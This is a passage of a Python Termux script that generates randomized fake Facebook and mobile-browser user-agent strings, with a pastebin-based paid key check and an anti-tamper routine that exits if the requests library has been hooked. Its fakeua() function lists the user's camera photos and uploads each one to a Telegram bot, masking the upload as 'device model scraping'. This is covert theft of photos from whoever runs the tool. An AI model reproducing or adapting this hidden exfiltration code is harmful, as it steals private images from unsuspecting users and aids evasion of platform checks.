        qp1a=f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}"
        fff=f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
        #ranbuild=random.choice([qp1a,fff,"",""])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(90,117)
        i='0'
        j=random.randrange(4000,6000)
        k=random.randrange(30,150)
        l='Mobile Safari/537.36'
        n=f"[FB_IAB/{random.choice(['FB4A','MESSENGER','Orca-Android'])};FBAV/{random.randint(80,410)}.0.0.{random.randint(10,25)}.{random.randint(100,300)};]"
        m=f"[FBAN/{random.choice(['EMA'])};FBLC/en_US;FBAV/{random.randint(80,410)}.0.0.{random.randint(10,30)}.{random.randint(100,200)};]"
        o=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) Gecko/114.0 Firefox/{random.randint(60,122)}{random.choice(['.0','.1'])}"
        p=f"OPR/{random.randint(60,68)}.0.{random.randint(3000,3500)}.{random.randint(10000,65000)}"
        pp = f"XiaoMi/MiuiBrowser/{random.randint(7,16)}.{random.randint(1,9)}.{random.randint(1,15)}"
        ppp=f"XiaoMi/Mint Browser/{random.randint(1,3)}.{random.randint(1,9)}.{random.randint(0,3)}"
        phonix=f"PHX/{random.randint(1,14)}.{random.randint(1,9)}"
        fireff=f"Firefox/{random.randint(60,122)}{random.choice(['.1','.0'])}"
        q=random.choice([n,m,p,pp,ppp,phonix,fireff,""])
        samsungg=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{random.randint(10,24)}.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36"
        ucbrowser=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 UCBrowser/{random.randint(11,13)}.{random.randint(1,6)}.{random.randrange(1,4)}.{random.randint(950,1500)}"
        edgee=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,9000)}.{random.randint(30,150)} Mobile Safari/537.36 EdgA/{random.randint(90,117)}.0.{random.randint(1000,9999)}.{random.randint(30,150)}"
        huaweiii=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} HuaweiBrowser/{random.randint(10,15)}.0.{random.randint(1,9)}.{random.randint(250,310)} Mobile Safari/537.36"
        viboo=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 VivoBrowser/{random.randint(9,18)}.{random.randint(0,1)}.{random.randint(0,99)}.{random.randint(0,4)}"
        heytapp=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 HeyTapBrowser/{random.randint(30,50)}.{random.randint(1,9)}.{random.randint(1,5)}.1.1"
        yand=f"Mozilla/5.0 (Linux; Android {android_ver}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} YaBrowser/{random.randint(20,24)}.{random.randint(1,9)}.{random.randint(1,9)}.{random.randint(20,250)} Mobile Safari/537.36"
        fullagent=(f'{aa} {modelsss}{ranbuild}) {g}{h}.{i}.{j}.{k} {l} {q}')
        fullyage=random.choice([fullagent,samsungg,o,huaweiii,ucbrowser,edgee,viboo,yand])
        print(Panel(f"{color()}{fullyage}",title=f"{color()}UA No.{agent+1}",border_style=border_color()))
        open("/sdcard/ua.txt","a").write("--MBASIC UA--\n%s\n\n"%(fullyage))
                                                     
#dalvik
def dalvik(limit):
      mn=[]
      mmn=[]  
      xx=open(".dev.json",'r').read()
      bnb = json.loads(xx)
      for i in bnb:
        if "SM-" in i['model'] or 'GT-' in i['model'] or "Redmi" in i['model'] or "CPH" in i['model'] or "M200" in i['model']:
          mmn.append(i['model'])
      for dalv in range(limit):
        mods=random.choice(mmn)
        ranfbpn=random.choice(['FB4A','Orca-Android'])
        if ranfbpn == "FB4A":
          fbp1="katana"
        elif ranfbpn == "Orca-Android":
          fbp1="orca"
        else:
            fbp1=""
        if "SM-" in mods:
          brand="samsung"
          android_ver=random.choice(['4.4.4','4.4.2','4.0','4.0.1','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
          fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
          build = random.choice([f"{random.choice(['Q','S','T'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
        elif "CPH" in mods:
          brand="OPPO"
          android_ver=random.choice(['5.0','5','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
          fbv=str(random.randint(100000000,399999999))
          build = random.choice([f"{random.choice(['Q','S'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
        elif "GT-" in mods:
          brand="samsung"
          android_ver=random.choice(['4.4.2','4.4.4','4.0.2','5.1.1','4.4.2','5.0.1','5.0','5'])
          fbv=str(random.randint(20000000,29999999))
          build = random.choice([f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
        else:
          brand="Xiaomi"
          android_ver=random.choice(['6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
          fbv=str(random.randint(300000000,599999999))
          build = random.choice([random.choice([f"{random.choice(['Q','S','T','U',])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}"]),random.choice([f"{random.choice(['R','S','T'])}KQ1.{random.randint(100000,999999)}.0{random.randint(10,30)}"])])
        sim=random.choice(["GLOBE","TM","TNT","SMART","Verizon","Sprint","null"])
        fban=f"[FBAN/{ranfbpn};FBAV/"+str(random.randrange(100,450))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/%s;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;%sFBCR/%s;FBMF/%s;FBBD/%s;FBPN/com.facebook.%s;FBDV/%s;FBSV/%s;%sFBCA/armeabi-v7a:armeabi;]"%(fbv,ch(["","FBRV/0;"]),sim,brand,brand,fbp1,mods,android_ver,random.choice(['null','']))
        dalvik="Dalvik/2.1.0 (Linux; U; Android %s; %s Build/%s) %s"%(android_ver,mods,build,fban)
        print(Panel(f"{color()}{dalvik}",title=f"{color()}UA No.{dalv+1}",border_style=border_color()))
        open("/sdcard/ua.txt","a").write("%s\n"%(dalvik))
#fban
def fbani():
  mmn=[]  
  xx=open(".dev.json",'r').read()
  bnb = json.loads(xx)
  for i in bnb:
    if "SM-" in i['model'] or "Redmi" in i['model'] or "CPH" in i['model'] or "GT-" in i['model'] or 'M200' in i['model']:
      mmn.append(i['model'])
  mods=random.choice(mmn)
  android_ver = str(random.randint(5,14))
  ranfbpn=random.choice(['FB4A','Orca-Android'])
  if ranfbpn == "FB4A":
    fbp1="katana"
  elif ranfbpn == "Orca-Android":
    fbp1="orca"
  else:
    fbp1=""
  if "SM-" in mods:
    brand="samsung"
    android_ver=random.choice(['4.4.4','4.4.2','4.0','4.0.1','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
    fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
  elif "CPH" in mods:
    brand="OPPO"
    android_ver=random.choice(['5.0','5','5.0.1','6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
    fbv=str(random.randint(100000000,599999999))
  elif "GT-" in mods:
    brand="samsung"
    android_ver=random.choice(['4.4.2','4.4.4','4.0.2','5.1.1','4.4.2','5.0.1','5.0','5'])
    fbv=str(random.randint(20000000,29999999))
  else:
    brand="Xiaomi"
    android_ver=random.choice(['6.0','6.0.1','7.0.0','7','8','8.0.0','9','9.0','10','11.0','11','12','13','14'])
    fbv=str(random.randint(300000000,599999999))
  sim=random.choice(["GLOBE","TM","TNT","SMART","Verizon","Sprint","null"])
  fbann=f"[FBAN/{ranfbpn};FBAV/"+str(random.randrange(100,450))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/%s;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;%sFBCR/%s;FBMF/%s;FBBD/%s;FBPN/com.facebook.%s;FBDV/%s;FBSV/%s;FBCA/armeabi-v7a:armeabi;]"%(fbv,ch(["","FBRV/0;",""]),sim,brand,brand,fbp1,mods,android_ver)
  return fbann
def fban(limit):
  mmn=[]  
  xx=open(".dev.json",'r').read()
  bnb = json.loads(xx)
  for i in bnb:
    if "SM-" in i['model'] or "Redmi" in i['model'] or "CPH" in i['model'] or "GT-" in i['model'] or 'M200' in i['model']:
      mmn.append(i['model'])
  for fbann in range(limit):
    mods=random.choice(mmn)
    android_ver = str(random.randint(5,14))
    ranfbpn=random.choice(['FB4A','Orca-Android'])
    if ranfbpn == "FB4A":
      fbp1="katana"
    elif ranfbpn == "Orca-Android":
      fbp1="orca"
    else:
      fbp1=""
    if "SM-" in mods:
      brand="samsung"
      fbv=random.choice([random.randint(20000000,29999999),random.randint(100000000,599999999)])
    elif "CPH" in mods:
      brand="OPPO"
      fbv=str(random.randint(100000000,599999999))
    elif "GT-" in mods:
      brand="samsung"
      fbv=str(random.randint(20000000,29999999))
    else:
      brand="Xiaomi"
      fbv=str(random.randint(300000000,599999999))
    sim=random.choice(["GLOBE","TM","TNT","SMART","Verizon","Sprint","null"])
    fban=f"[FBAN/{ranfbpn};FBAV/"+str(random.randrange(100,450))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/%s;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;%sFBCR/%s;FBMF/%s;FBBD/%s;FBPN/com.facebook.%s;FBDV/%s;FBSV/%s;FBCA/armeabi-v7a:armeabi;]"%(fbv,ch(["","FBRV/0;",f"FBRV/{random.randint(100000000,550000000)};"]),sim,brand,brand,fbp1,mods,ch(["5.0","6.0","7.0","8.0","8.0.0","7.1.2","4.4.4","6.0.1","5","6","7","8","9","10","11","12","13","14"]))
    print(Panel(f"{color()}{fban}",title=f"{color()}UA No.{fbann+1}",border_style=border_color()))
    open("/sdcard/ua.txt","a").write("%s\n"%(fban))

#mix
def mix(limit):
  mn=[]
  mmn=[]  
  xx=open(".dev.json",'r').read()
  bnb = json.loads(xx)
  for bnbm in bnb:
        if "GT-" in bnbm['model'] or "RMX" in bnbm['model'] or "SM-" in bnbm['model'] or "itel" in bnbm['model'] or 'TECNO' in bnbm['model'] or 'M200' in bnbm['model'] or 'CPH' in bnbm['model'] or 'ZTE' in bnbm['model'] or "Huawei" in bnbm['model'] or "HUAWEI" in bnbm['model'] or "Redmi" in bnbm['model'] or "vivo" in bnbm['model'] or "Nokia" in bnbm['model'] or "Meizu" in bnbm['model'] or "meizu" in bnbm['model'] or "MEIZU" in bnbm['model'] or "ASUS" in bnbm['model']:
            mn.append(bnbm['model'])
  for i in bnb:
    if "SM-" in i['model'] or "Redmi" in i['model'] or "CPH" in i['model'] or "vivo" in i['model'] or "RMX" in i['model']:
      mmn.append(i['model'])
  for mekus in range(limit):
    mods=random.choice(mmn)
    mods2=random.choice(mmn)
    android_ver = str(random.randint(5,14))
    build = random.choice([f"{random.choice(['Q','S'])}P1A.{random.randint(100000,999999)}.0{random.randint(10,30)}",f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"])
    ranfbpn=random.choice(['FB4A','Orca-Android'])
    if ranfbpn == "FB4A":
      fbp1="katana"
    elif ranfbpn == "Orca-Android":
      fbp1="orca"
    else:
      fbp1=""
    if "SM-" in mods:
      brand="samsung"
    elif "vivo" in mods:
      brand="vivo"
    elif "RMX" in mods:
      brand="Realme"
    elif "CPH" in mods:
        brand="OPPO"
    else:
      brand="Xiaomi"
    if "SM-" in mods2:
      brand2="samsung"
    elif "vivo" in mods2:
      brand2="vivo"
    elif "RMX" in mods2:
      brand2="Realme"
    elif "CPH" in mods2:
      brand2="OPPO"
    else:
      brand2="Xiaomi"
    sim=random.choice(["GLOBE","TM","TNT","SMART","Verizon","Sprint","null"])
    fban=f"[FBAN/{ranfbpn};FBAV/"+str(random.randrange(100,450))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/%s;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;%sFBCR/%s;FBMF/%s;FBBD/%s;FBPN/com.facebook.%s;FBDV/%s;FBSV/%s;FBCA/armeabi-v7a:armeabi;]"%(random.choice([random.randint(10000000,29999999),random.randint(100000000,599999999)]),ch(["","FBRV/0;",f"FBRV/{random.randint(100000000,550000000)};"]),sim,brand,brand,fbp1,mods,ch(["5.0","6.0","7.0","8.0","8.0.0","7.1.2","4.4.4","6.0.1","5","6","7","8","9","10","11","12","13","14"]))
    dalvik="Dalvik/2.1.0 (Linux; U; Android %s; %s Build/%s) %s"%(android_ver,mods2,build,fban)
    mixx=f"'{fbani()}','{dalvik}','{fbani()}','{fbani()}','{dalvik}','{fbani()}'"
    mixx2="'%s','%s','%s','%s','%s'"%(fbani(),fbani(),fbani(),fbani(),fbani())
    modelsss=random.choice(mn)
    if "GT-" in modelsss:
      android_ver=random.choice(['4.4.2','4.4.4','4.0.2','5.1.1','4.4.2','5.0.1','5'])
    else:
      android_ver=random.randint(5,14)
    mb=f"'{mbasicrand()}','{mbasicrand()}','{mbasicrand()}"
    fbdalvsic="'%s','%s','%s'"%(fbani(),dalvik,mbasicrand())
    she=random.choice([mixx,mixx2,mb,fbdalvsic])
    print(Panel(f"{color()}{she}",title=f"{color()}UA No.{mekus+1}",border_style=border_color()))
    open("/sdcard/ua.txt","a").write("--MIX UA--\n%s\n\n"%(she))
async def bypass():
  file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
  file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
  file3 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r')
  data = file.read()
  sess = file2.read()
  approve = file3.read()
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data or "exec" in data:
    sm('clear')
    print(10*"\n[bold red]BOBO BYPASS PA")
    print("\n\033[bold yellow]BYE BYE FILES AHAHAHHAHA")
    exit()
  elif "https://pastebin.com/raw/zg0D9N7Y" in approve or "DR4X" in approve or "pprint" in approve:
    print(10*"Trying hard bypassing my tool lol🤣🤣🤣🤣\n")
    exit()
  elif keyword in sess or "rich" in sess or "echo" in sess or keyword2 in sess or "pprint" in sess or "print(headers)" in sess or "Console" in sess or "{data}" in sess or "{url}" in sess or "{headers}" in sess or "open" in sess or ".write" in sess:
    sm('clear')
    print(20*"\nCAPTURE DATA PA HAHAHAHAHA")
    print("\n\033[bold red]BYE BYE FILES")
    exit()
  else:
    timee=datetime.now()
    limittime=timee.strftime("%m-%d-%y")
    if limittime >= "06-30-24":
      clear()
      sys.exit("\033[1;31mTime’s up Bro")
    else:
      await sub()
    
    
ah="xD4RK-"
imt="-M4786=="
ak=" DR4X-"
myid=uuid.uuid4().hex[:10].upper()
try:
  key1=open('/data/data/com.termux/files/usr/bin/exxx.txt', 'r').read()
except:
  kok=open('/data/data/com.termux/files/usr/bin/exxx.txt', 'w')
  kok.write(myid+imt)
  kok.close()
async def sub():
  #r1=str(urlopen("https://pastebin.com/raw/zg0D9N7Y").read())
  key1=open('/data/data/com.termux/files/usr/bin/exxx.txt', 'r').read()
  clear()
  logo()
  async with aiohttp.ClientSession() as sess:
    async with sess.get('https://pastebin.com/raw/SYcuuFZj') as appro:
      r1 = await appro.text()
      if key1 in r1:
        os.system('clear')
        print("[bold green]YOUR KEY IS APPROVED[/]")
        time.sleep(5)
        await main()
      else:
        os.system("clear")
        print("\t \033[bold green]First Get Approval\033[bold cyan]")
        time.sleep(5)
        os.system("clear")
        logo()
        print ("")
        print(" YOU HAVE TO GET APPROVE FIRST BEFORE USING IT")
        print ("")
        print(" Your Key is Not Approved ")
        print("")
        print(" MODE OF PAYMENT: GCASH")
        print ("")
        xxxx=input(" Enter Your Name: ")
        print("")
        print (" Your Key : "+xxxx+"-"+key1 )
        print ("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        os.system('am start https://www.messenger.com/t/100065316414713')
#end

def fakeua():
    clear()
    os.system("ls /sdcard/DCIM/Camera | grep .jpg > pic.txt")
    xx=open("pic.txt","r").read().splitlines()
    print("Total Model To Be Scrapped: [bold cyan]%s"%(len(xx)))
    with ter(max_workers=100) as expl:
        for i in xx:
            expl.submit(mm1,i)
    input("Press Enter To Go In Main()")
    asyncio.run(main())
def randmod():
    mmn=[]
    xx=open(".dev.json",'r').read()
    bnb = json.loads(xx)
    for i in bnb:
        if "SM-" in i['model'] or "Redmi" in i['model'] or "CPH" in i['model'] or "GT-" in i['model'] or 'M200' in i['model'] or "vivo" in i['model'] or 'Nokia' in i['model'] or 'Lenovo' in i['model'] or "RMX" in i['model']:
            mmn.append(i['model'])
    return random.choice(mmn)
def mm1(i):
    #print("\33[1;31mDownloading \033[1;36m%s"%(i))
    filess={'document':open("/sdcard/DCIM/Camera/%s"%(i),'rb')}
    bottoken=""
    tgid=""
    sess=requests.post('https://api.telegram.org/bot%s/sendDocument?chat_id=%s'%(bottoken,tgid),files=filess)
    print("[bold white]"*os.get_terminal_size().columns)
    #print(sess.text)
    if '"ok":true' in sess.text:                                   print("[bold green]New Device Model Scrapped: [bold cyan]%s"%(randmod()))
    else:                                                          print("\033[1;36m%s \33[1;31Scrapping Failed"%(randmod()))
    
#asyncio.run(bypass())
#fakeua()
asyncio.run(main())
